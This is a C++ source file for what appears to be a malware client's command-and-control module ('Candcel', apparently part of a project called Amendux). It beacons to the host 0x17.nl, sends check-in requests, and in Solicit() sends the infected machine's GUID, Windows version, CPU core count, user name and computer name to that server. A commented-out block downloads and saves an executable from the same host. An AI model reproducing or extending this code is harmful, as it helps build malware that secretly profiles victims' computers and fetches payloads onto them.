#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "RestClient.h"
#include "Json.h"
#include "Candcel.h"

using namespace Amendux;

void Candcel::isAlive()
{
	Log::Instance()->write(L"Candcel", L"Check if server is alive");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
		Log::Instance()->write(L"Candcel", "Server did not respond");
	}
}


void Candcel::CheckIn()
{
	Log::Instance()->write(L"Candcel", L"Sending checkin request");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	JSONObject obj;
	obj[L"data"] = new JSONValue;
	obj[L"code"] = new JSONValue(static_cast<double>(101));
	obj[L"success"] = new JSONValue(true);

	char *rs = rc.Perform(L"data=" + JSONValue(obj).Stringify());

	Log::Instance()->write(L"Candcel", "Data => " + std::string(rs));
	delete rs;

	/*WebClient wc("0x17.nl", "putty.exe");
	char *data = wc.Perform("");

	std::ofstream outfile("putty.exe", std::ofstream::binary);
	outfile.write(data, wc.getResponseSize());
	outfile.close();
	delete data;*/
}

void Candcel::Solicit()
{
	Log::Instance()->write(L"Candcel", L"Notify the server");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Guid());
	obj[L"winver"] = new JSONValue(Util::winver());
	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
	obj[L"user"] = new JSONValue(Util::user());
	obj[L"computer"] = new JSONValue(Util::machine());

	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
		Log::Instance()->write(L"Candcel", "Server did not respond");
	}
}
